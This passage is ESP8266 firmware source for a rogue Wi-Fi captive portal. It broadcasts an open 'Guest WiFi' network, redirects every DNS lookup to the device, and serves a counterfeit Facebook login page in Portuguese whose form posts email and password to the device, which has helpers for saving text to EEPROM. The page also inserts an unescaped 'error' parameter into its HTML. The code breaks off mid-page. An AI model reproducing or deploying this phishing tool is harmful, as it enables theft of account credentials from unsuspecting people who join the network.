#include <EEPROM.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>

String SSID_NAME = "Guest WiFi";

const byte HTTP_PORT = 80;
const byte DNS_PORT = 53;

IPAddress apIP(172, 0, 0, 1);
IPAddress netMask(255, 255, 255, 0);

DNSServer dnsServer;
ESP8266WebServer httpServer(HTTP_PORT);

void writeToMemory(String text) {
    int addr = 0;
    if (text.length() > 511) {
        text = text.substring(0, 511);
    }
    for (int i = 0; i < text.length(); i++) {
        if (EEPROM.read(addr) != text[i]) {
            EEPROM.write(addr, text[i]);
        }
        addr++;
    }
    EEPROM.write(addr, '\0');
    EEPROM.commit();
}

String readFromMemory() {
    String text;
    char c;
    int addr = 0;

    while ((c = EEPROM.read(addr++)) != '\0' && addr < 512) {
        text += c;
    }

    return text;
}

void clearMemory() {
    for (int i = 0; i < 512; i++) {
        EEPROM.write(i, 0);
    }
    EEPROM.commit();
}

bool validateEmail(String email) {
    int atIdx = email.indexOf('@');
    int dotIdx = email.lastIndexOf('.');
    return (atIdx > 0 && dotIdx > atIdx);
}

bool validatePassword(String password) {
    return password.length() >= 6;
}

void setup() {
    Serial.begin(9600);
    EEPROM.begin(512);
    if (!SPIFFS.begin()) {
        Serial.println("Failed to mount file system");
        return;
    } else {
        Serial.println("File system mounted");
    }

    delay(10);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMask);
    WiFi.softAP(SSID_NAME);

    dnsServer.start(DNS_PORT, "*", apIP);

    httpServer.on("/", []() {
        String html = "<!DOCTYPE html><html lang='pt-br'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Login</title><style>"
                      "body {font-family: 'Roboto', sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0;}"
                      ".login-container {background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); width: 300px; text-align: center;}"
                      "input[type='email'], input[type='password'] {width: calc(100% - 20px); padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd;}"
                      "button {width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;}"
                      "a {color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px;}"
                      ".meta {color: #606770; font-size: 12px; text-align: center; margin-top: 20px;}"
                      ".error {color: red; margin-bottom: 10px;}"
                      ".facebook-logo {font-family: 'Roboto', sans-serif; font-weight: bold; color: #1877f2; font-size: 48px; margin-bottom: 20px;}"
                      "</style></head><body>"
                      "<div class='login-container'>"
                      "<div class='facebook-logo'>facebook</div>"
                      "<form method='POST' action='/postinfo'>"
                      "<input type='email' name='email' placeholder='Número do celular ou email' required><br>"
                      "<input type='password' name='password' placeholder='Senha' required><br>";
        if (httpServer.hasArg("error")) {
            html += "<div class='error'>" + httpServer.arg("error") + "</div>";
        }
        html += "<button type='submit'>Entrar</button>"
                "<a href='#'>Esqueceu a senha?</a>"
                "<div class='meta'>Criar nova conta</div>"
                "<div
